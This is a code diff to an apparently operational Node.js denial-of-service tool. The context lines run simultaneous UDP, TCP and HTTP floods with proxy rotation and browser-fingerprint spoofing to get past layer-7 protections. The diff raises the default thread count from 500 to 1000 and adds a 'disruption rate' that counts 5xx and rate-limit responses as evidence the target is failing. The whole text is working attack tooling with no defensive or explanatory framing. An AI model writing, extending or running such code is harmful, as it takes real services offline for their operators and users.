@@ -16,7 +16,7 @@ const nport = require("./nport.js");
 
 
 const REQUESTS_PER_CYCLE = parseInt(process.env.PER_THREAD, 10) || 3;
-const numThreads = parseInt(process.env.MAX_THREADS, 10) || 500;
+const numThreads = parseInt(process.env.MAX_THREADS, 10) || 1000;
 const MAX_QUEUE = parseInt(process.env.MAX_QUEUE, 10) || 20;
 const REQUEST_TIMEOUT = parseInt(process.env.TIMEOUT, 10) || 10000;
 const USE_UDP = process.env.UDP_FLOOD !== "false";
@@ -271,6 +271,16 @@ const hostFailureCount = new Map();
 let lastSuccessTime = Date.now();
 
 const threadBackoff = new Map();
+const threadTypes = new Map();
+
+function countThreadTypes() {
+  let direct = 0, proxy = 0;
+  for (const t of threadTypes.values()) {
+    if (t === "direct") direct++;
+    else proxy++;
+  }
+  return { direct, proxy };
+}
 
 const fireHTTPRequest = (url, ctx, threadId) => {
   return new Promise((resolve) => {
@@ -430,6 +440,66 @@ let tunnelActive = false;
 let saveTimer = null;
 let statusInterval = null;
 let totalReqCount = 0;
+const statusCounts = new Map();
+
+const STATUS_LABELS = {
+  200: "OK", 201: "Created", 204: "No Content",
+  301: "Moved", 302: "Found", 304: "Not Mod",
+  400: "Bad Req", 401: "Unauth", 403: "Forbidden", 404: "Not Found", 429: "Rate Limit",
+  500: "Error", 501: "Not Impl", 502: "Bad Gateway", 503: "Unavail", 504: "Gateway Timeout", 505: "HTTP Ver",
+  520: "Web Unknown", 521: "Web Down", 522: "Conn Timeout", 523: "Origin Unreach", 524: "Timeout", 525: "SSL Fail", 526: "Invalid SSL", 529: "Overload", 530: "Site Frozen",
+};
+
+function recordStatus(code) {
+  const key = code ? String(code) : "error";
+  statusCounts.set(key, (statusCounts.get(key) || 0) + 1);
+}
+
+function formatStatusLine() {
+  const parts = [];
+  const disruptionCodes = [400, 401, 403, 404, 429, 500, 502, 503, 504, 520, 521, 522, 523, 524, 525, 526, 529, 530];
+  const sorted = [...statusCounts.entries()]
+    .filter(([code]) => code === "error" || disruptionCodes.includes(parseInt(code)))
+    .sort((a, b) => b[1] - a[1]);
+  for (const [code, count] of sorted.slice(0, 5)) {
+    if (count === 0) continue;
+    const n = parseInt(code);
+    let color = colors.yellow;
+    if (n >= 500) color = colors.red;
+    else if (isNaN(n)) color = colors.gray;
+    parts.push(`${code === "error" ? "ERR" : code}:${color(formatNumber(count))}`);
+  }
+  return parts.join(" ");
+}
+
+function getDisruptionRate() {
+  const disruptionCodes = [403, 429, 500, 502, 503, 504, 520, 521, 522, 523, 524, 525, 526, 529, 530];
+  let total = 0, disruptions = 0;
+  for (const [code, count] of statusCounts) {
+    total += count;
+    const n = parseInt(code);
+    if (isNaN(n) || disruptionCodes.includes(n)) disruptions += count;
+  }
+  return { pct: total > 0 ? Math.round((disruptions / total) * 100) : 0, count: disruptions, total };
+}
+
+function formatStatusDetail() {
+  const lines = [];
+  const sorted = [...statusCounts.entries()]
+    .map(([code, count]) => ({ code, count, num: parseInt(code) }))
+    .sort((a, b) => b.count - a.count);
+  for (const { code, count, num } of sorted) {
+    const label = STATUS_LABELS[num] || "";
+    const icon = isNaN(num) ? colors.gray("⚠") : (num >= 500 ? colors.red("✕") : num >= 400 ? colors.yellow("!") : colors.green("✓"));
+    lines.push(`  ${icon} ${code === "error" ? "ERR" : code}${label ? ` ${colors.gray(label)}` : ""}: ${colors.bold(formatNumber(count))}`);
+  }
+  if (statusCounts.size > 0) {
+    const dr = getDisruptionRate();
+    const color = dr.pct > 50 ? colors.red : dr.pct > 20 ? colors.yellow : colors.green;
+    lines.push(`  ${colors.bold("Disruption Rate:")} ${color(`${dr.pct}%`)} (${formatNumber(dr.count)}/${formatNumber(dr.total)} responses indicate service impairment)`);
+  }
+  return lines.join("\n");
+}
 
 
 
@@ -454,6 +524,11 @@ continueAttack = state.continueAttack;
 currentTarget = state.currentTarget;
 totalRequestsSent = state.totalRequests || 0;
 targetQueue = state.queue || [];
+if (state.statusCounts && typeof state.statusCounts === "object") {
+  for (const [code, count] of Object.entries(state.statusCounts)) {
+    statusCounts.set(code, count);
+  }
+}
 
 if (currentTarget && currentTarget.startTime && Date.now() - currentTarget.startTime >= currentTarget.duration) {
   console.log(colors.yellow(`Target duration expired: ${currentTarget.url}`));
@@ -475,6 +550,7 @@ function debouncedSave() {
   if (saveTimer) return;
   saveTimer = setTimeout(() => {
     state.totalRequests = totalRequestsSent + totalReqCount;
+    state.statusCounts = Object.fromEntries(statusCounts);
     fs.writeFile(stateFilePath, JSON.stringify(state), () => {});
     saveTimer = null;
   }, 500);
@@ -485,12 +561,14 @@ function saveNow() {
   totalRequestsSent += totalReqCount;
   totalReqCount = 0;
   state.totalRequests = totalRequestsSent;
+  state.statusCounts = Object.fromEntries(statusCounts);
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 }
 
 function resetTotal() {
   totalRequestsSent = 0;
   totalReqCount = 0;
+  statusCounts.clear();
   state.totalRequests = 0;
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
   console.log(colors.green("Total reset to 0"));
@@ -506,7 +584,10 @@ function startStatusDisplay() {
     totalReqCount = 0;
     if (count > 0 || lastStatusLog > 0) {
       const wallPct = currentTarget ? Math.round(((Date.now() - currentTarget.startTime) / currentTarget.duration) * 100) : 0;
-      console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(count)} req/s`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.magenta(`Threads: ${activeThreads.length}`)} | ${colors.green(`${Math.min(100, wallPct)}%`)}`);
+      const { direct, proxy } = countThreadTypes();
+      const statusLine = formatStatusLine();
+      const statusPart = statusLine ? ` | ${statusLine}` : '';
+      console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(count)} req/s`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.magenta(`D:${direct}`)} ${colors.yellow(`P:${proxy}`)} | ${colors.cyan(`T:${direct+proxy}`)}${statusPart} | ${colors.green(`${Math.min(100, wallPct)}%`)}`);
       debouncedSave();
     }
     lastStatusLog = Date.now();
@@ -552,16 +633,16 @@ const startAttack = async (url, durationHours) => {
   if (L7_BYPASS) console.log(colors.magenta("L7 BYPASS: ON (browser TLS fingerprints + Sec-* headers + cookie persistence + jitter)"));
   console.log(colors.green("ALL ATTACK LAYERS RUNNING CONCURRENTLY (L4 UDP + L4 TCP + L7 HTTP)"));
   if (tunnelActive && nportUrl) console.log(colors.magenta(`Public: ${nportUrl}`));
-  console.log("");
-
-  
-  activeThreads = [];
+  console.log("");    activeThreads = [];
+  threadTypes.clear();
   let threadId = 0;
   for (let i = 0; i < numThreads; i++) {
     if (!continueAttack) break;
     if (proxies.length && Math.random() < 0.5) {
+      threadTypes.set(threadId, "proxy");
       performAttackSingle(currentTarget, createContext(getRandomElement(proxies)), threadId++);
     } else {
+      threadTypes.set(threadId, "direct");
       performAttackSingle(currentTarget, { type: "direct" }, threadId++);
     }
     activeThreads.push(i);
@@ -590,13 +671,16 @@ const performAttackSingle = async (target, ctx, threadId) => {
         saveNow();
         currentTarget = nextTarget;
         threadBackoff.clear();
+        threadTypes.clear();
         const proxies = loadProxies();
         let nextThreadId = 0;
         for (let i = 0; i < numThreads; i++) {
           if (!continueAttack) break;
           if (proxies.length && Math.random() < 0.5) {
+            threadTypes.set(nextThreadId, "proxy");
             performAttackSingle(nextTarget, createContext(getRandomElement(proxies)), nextThreadId++);
           } else {
+            threadTypes.set(nextThreadId, "direct");
             performAttackSingle(nextTarget, { type: "direct" }, nextThreadId++);
           }
         }
@@ -645,7 +729,16 @@ const performAttackSingle = async (target, ctx, threadId) => {
     try {
       const results = await Promise.allSettled(promises);
       for (const r of results) {
-        if (r.status === "fulfilled" && r.value && r.value.status) successfulRequests++;
+        if (r.status === "fulfilled" && r.value) {
+          if (r.value.status) {
+            successfulRequests++;
+            recordStatus(r.value.status);
+          } else {
+            recordStatus(null);
+          }
+        } else {
+          recordStatus(null);
+        }
       }
     } catch {}
 
@@ -672,7 +765,7 @@ const performAttackSingle = async (target, ctx, threadId) => {
         if (ctx.proxyFails >= 3) {
           console.log(colors.yellow(`[Thread ${threadId}] Proxy dead — falling back to direct connection`));
           ctx = { type: "direct" };
-          
+          threadTypes.set(threadId, "direct");
           threadBackoff.delete(threadId);
           backoffDelay = 0;
         }
@@ -711,12 +804,18 @@ const stopAttack = async () => {
   closeAllUdpSockets();
   stopStatusDisplay();
   activeThreads = [];
+  threadTypes.clear();
   currentTarget = null;
   targetQueue = [];
   resetTotal();
   state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
   saveNow();
   console.log(colors.yellow("\nAttack Stopped"));
+  if (statusCounts.size > 0) {
+    console.log(colors.cyan("\n=== FINAL RESPONSE STATUS ==="));
+    console.log(formatStatusDetail());
+    console.log("");
+  }
   console.log(colors.green("Queue cleared. Total reset to 0\n"));
 };
 
@@ -728,13 +827,16 @@ const resumeAttack = async () => {
 
   const proxies = loadProxies();
   activeThreads = [];
+  threadTypes.clear();
   let threadId = 0;
 
   for (let i = 0; i < numThreads; i++) {
     if (!continueAttack) break;
     if (proxies.length && Math.random() < 0.5) {
+      threadTypes.set(threadId, "proxy");
       performAttackSingle(currentTarget, createContext(getRandomElement(proxies)), threadId++);
     } else {
+      threadTypes.set(threadId, "direct");
       performAttackSingle(currentTarget, { type: "direct" }, threadId++);
     }
     activeThreads.push(i);
@@ -763,13 +865,16 @@ const showStatus = () => {
   const wallMin = Math.round(wallElapsed / 60000);
   const targetMin = Math.round(currentTarget.duration / 60000);
   const wallPct = currentTarget.duration > 0 ? Math.min(100, Math.round((wallElapsed / currentTarget.duration) * 100)) : 0;
+  const { direct, proxy } = countThreadTypes();
   console.log(colors.cyan("\n=== ATTACK STATUS ==="));
   console.log(`${colors.yellow("Current Target:")} ${currentTarget.url}`);
   console.log(`${colors.gray(`Target duration: ${targetMin}min`)}`);
   console.log(`${colors.cyan(`Wall-clock elapsed: ${wallMin}min (${wallPct}%)`)}`);
   console.log(`${colors.green("Requests Sent:")} ${formatNumber(totalRequestsSent + totalReqCount)}`);
-  console.log(`${colors.cyan("Active Threads:")} ${activeThreads.length}`);
+  console.log(`${colors.magenta(`Direct:`)} ${direct} threads | ${colors.yellow(`Proxy:`)} ${proxy} threads`);
   console.log(`${colors.magenta("Queue:")} ${targetQueue.length}/${MAX_QUEUE}`);
+  console.log(colors.cyan("\n=== RESPONSE STATUS ==="));
+  console.log(formatStatusDetail());
   if (targetQueue.length > 0) {
     console.log(`${colors.yellow("\nQueued Targets:")}`);
     targetQueue.forEach((t, idx) => {
@@ -865,12 +970,17 @@ app.get("/stop", async (req, res) => {
 });
 
 app.get("/status", (req, res) => {
+  const { direct, proxy } = countThreadTypes();
+  const statusBreakdown = Object.fromEntries(statusCounts);
   res.json({
     active: continueAttack,
     currentTarget: currentTarget ? currentTarget.url : null,
     totalRequests: totalRequestsSent + totalReqCount,
     threads: activeThreads.length,
+    threadsDirect: direct,
+    threadsProxy: proxy,
     queueCount: targetQueue.length,
+    statusCounts: statusBreakdown,
   });
 });
 
